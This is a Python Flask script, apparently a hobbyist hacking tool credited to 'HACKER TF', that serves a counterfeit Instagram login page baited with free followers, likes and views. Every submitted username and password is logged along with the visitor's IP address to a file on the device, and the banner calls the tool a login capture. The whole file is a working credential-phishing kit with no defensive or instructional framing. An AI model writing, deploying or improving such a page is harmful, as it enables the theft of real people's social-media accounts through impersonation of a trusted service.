from flask import Flask, request, render_template_string
import os

app = Flask(__name__)
SAVE_PATH = "/sdcard/HackerTF"
LOG_FILE = os.path.join(SAVE_PATH, "log.txt")
os.makedirs(SAVE_PATH, exist_ok=True)

html_template = """
<!DOCTYPE html>
<html>
<head>
    <title>Instagram</title>
    <style>
        body { font-family: sans-serif; background: #fafafa; display: flex; flex-direction: column; align-items: center; padding-top: 50px; }
        .box { background: white; padding: 30px; border: 1px solid #ccc; width: 300px; text-align: center; }
        input, select { width: 90%; padding: 10px; margin: 8px 0; }
        button { padding: 10px 20px; background: #3897f0; color: white; border: none; cursor: pointer; }
        .footer { margin-top: 20px; font-size: 14px; }
    </style>
</head>
<body>
    <div class="box">
        <h2>Instagram</h2>
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Phone number, username, or email" required><br>
            <input type="password" name="password" placeholder="Password" required><br>
            <select name="package">
                <option value="50 Followers">50 Followers</option>
                <option value="100 Followers">100 Followers</option>
                <option value="500 Likes">500 Likes</option>
                <option value="1000 Views">1000 Views</option>
            </select><br>
            <button type="submit">Log In</button>
        </form>
    </div>
    <div class="footer">Opening followers panel...</div>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(html_template)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    package = request.form.get('package')
    ip = request.remote_addr

    log = f"""
[+] Instagram Login
IP: {ip}
Username: {username}
Password: {password}
Selected: {package}
----------------------------
"""
    print(log)
    with open(LOG_FILE, "a") as f:
        f.write(log)

    return "<h3>Loading followers panel...</h3>"

if __name__ == '__main__':
    os.system('clear' if os.name == 'posix' else 'cls')
    print("\033[1;35m" + "="*40)
    print("      Instagram Login Capture      ")
    print("         Made by HACKER TF         ")
    print("="*40 + "\033[0m")
    print("Server running on: http://localhost:5000\n")
    app.run(host="0.0.0.0", port=5010)